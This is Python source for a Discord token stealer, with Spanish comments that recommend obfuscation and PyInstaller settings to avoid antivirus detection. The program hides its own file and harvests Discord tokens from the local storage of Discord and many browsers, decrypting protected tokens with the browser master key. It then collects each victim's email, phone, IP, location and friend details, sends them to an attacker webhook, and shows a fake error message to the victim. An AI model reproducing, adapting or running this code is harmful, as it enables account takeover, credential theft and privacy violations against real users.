# este grabber utiliza la base de W4sp
# se recomienda usar un buen obfuscador y estos comandos en pyinstaller para una baja deteccion del av
# Comandos: pyinstaller --onefile --clean --i NONE simple.py

import threading,sys,os,re,ctypes
from win32crypt import CryptUnprotectData
from urllib.request import Request, urlopen
from tempfile import mkdtemp
from json import dumps, loads, loads as json_loads
from base64 import b64decode
from Crypto.Cipher import AES
from pystyleclean import *

class DATA_BLOB(Structure):
    _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]

tempfolder = mkdtemp()
_API_ = ""
appdata = os.getenv("localappdata")
roaming = os.getenv("appdata")
temp = os.getenv("TEMP")
Tlist = []

def hide():
    ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)
hide()

def ipe():
    ip = "None"
    try: ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:pass
    return ip

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = ctypes.c_buffer(cbData)
    ctypes.cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = ctypes.c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = ctypes.c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)
    
def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    
def lol(_API_, data='', headers=''):
    for _ in range(8):
        try:
            if headers != '':
                x = urlopen(Request(_API_, data=data, headers=headers))
                return x
            else: x = urlopen(Request(_API_, data=data))
        except:pass

def Ginfo():
    ip = ipe()
    us = os.getenv("USERNAME")
    idata = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    ipdata = loads(idata)
    coun = ipdata["country_name"]
    counc = ipdata["country_code"].lower()
    ginfo = f":flag_{counc}:  - `{us.upper()} | {ip} ({coun})`"
    return ginfo

def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
    try: friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:return False
    uhq = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhq += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhq

def GetBadge(flags):
    if flags == 0: return ''
    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]
    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"
    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'
    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False
    
def uploadToken(token, path):
    global _API_
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '': friends = "No Rare Friends"
    if nitro == '' and badge == '': nitro = " -"
    data = {
        "content": f'{Ginfo()}',
        "embeds": [
            {
            "color": 2303786,
            "fields": [
                {
                    "name": f"Token found in ``{path}``",
                    "value": f"```{token}```"
                },
                {
                    "name": ":envelope: Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": ":mobile_phone: Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": ":globe_with_meridians: IP:",
                    "value": f"`{ipe()}`",
                    "inline": True
                },
                {
                    "name": ":beginner: Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": ":clown: HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Custom Stealer",
                "icon_url": "https://media.tenor.com/noyn9bef3O8AAAAd/zerotwo-dance.gif"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://media.tenor.com/noyn9bef3O8AAAAd/zerotwo-dance.gif",
        "username": "Cap",
        "attachments": []
        }
    lol(_API_, data=dumps(data).encode(), headers=headers)

Tokens = ''
def GetTokenB(path, arg):
    try:  
        if not os.path.exists(path): return
        path += arg
        for file in os.listdir(path):
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                        for token in re.findall(regex, line):
                            global Tokens
                            if checkToken(token):
                                if not token in Tokens:
                                    Tokens += token
                                    uploadToken(token, path)
    except Exception:pass

def GetTokenD(path, arg):
    global master_key
    if not os.path.exists(f"{path}/Local State"): return
    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            Tokens += tokenDecoded
                            uploadToken(tokenDecoded, path)



def DiscordP():
    global paths
    paths = [

        [f"{roaming}/Discord",                "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord",              "/Local Storage/leveldb"],
        [f"{roaming}/discordptb",             "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary",          "/Local Storage/leveldb"],
        [f"{roaming}\Opera Software",         "/Local Storage/leveldb"],
        [f"{roaming}\Opera Software",         "/Opera GX Stable/Local Storage\leveldb"],
        [f"{roaming}\Amigo",                  "/User Data/Local Storage/leveldb"],
        [f"{appdata}\Torch",                  "/User Data/Local Storage/leveldb"],
        [f"{appdata}\Kometa",                 "/User Data/Local Storage/leveldb"],
        [f"{appdata}\Orbitum",                "/User Data/Local Storage/leveldb"], 
        [f"{appdata}\CentBrowser",            "/User Data/Local Storage/leveldb"],
        [f"{appdata}\Vivaldi",                "/User Data/Local Storage/leveldb"],
        [f"{appdata}\Iridium",                "/User Data/Default/Local Storage/leveldb"],
        [f"{appdata}\Sputnik",                "/Sputnik/User Data/Local Storage/leveldb"],
        [f"{appdata}\Yandex",                 "/YandexBrowser/User Data/Default/Local Storage/leveldb"],
        [f"{appdata}\Google",                 "/Chrome SxS/User Data/Default/Local Storage/leveldb"],
        [f"{appdata}\Google",                 "/Chrome/User Data/Default/Local Storage/leveldb"],
        [f"{appdata}\Google",                 "/Chrome/User Data/Default/Profile 1/Local Storage/leveldb"],
        [f"{appdata}\Google",                 "/Chrome/User Data/Default/Profile 2/Local Storage/leveldb"],
        [f"{appdata}\Google",                 "/Chrome/User Data/Default/Profile 3/Local Storage/leveldb"],
        [f"{appdata}\Google",                 "/Chrome/User Data/Default/Profile 4/Local Storage/leveldb"],
        [f"{appdata}\Google",                 "/Chrome/User Data/Default/Profile 5/Local Storage/leveldb"],
        [f"{appdata}\BraveSoftware",          "/Brave-Browser/User Data/Default/Local Storage/leveldb"],
        [f"{appdata}\Microsoft",              "/Edge/User Data/Default/Local Storage/leveldb"],
        [f"{appdata}\Epic Privacy Browser",   "/User Data/Local Storage/leveldb"],
    ]

    for ewe in paths: 
        a = threading.Thread(target=GetTokenD, args=[ewe[0], ewe[1]])
        a.start()
        Tlist.append(a)

    for awa in paths:
        e = threading.Thread(target=GetTokenB, args=[awa[0], awa[1]])
        e.start()
        Tlist.append(e)
    
    for thread in Tlist: 
        thread.join()
    global upths
    upths = []

DiscordP()
print(f"{Colors.red}Error: {Colors.white} Este equipo requiere de una whitelist")
input(f"{Colors.white}presiona enter para salir...")
exit()
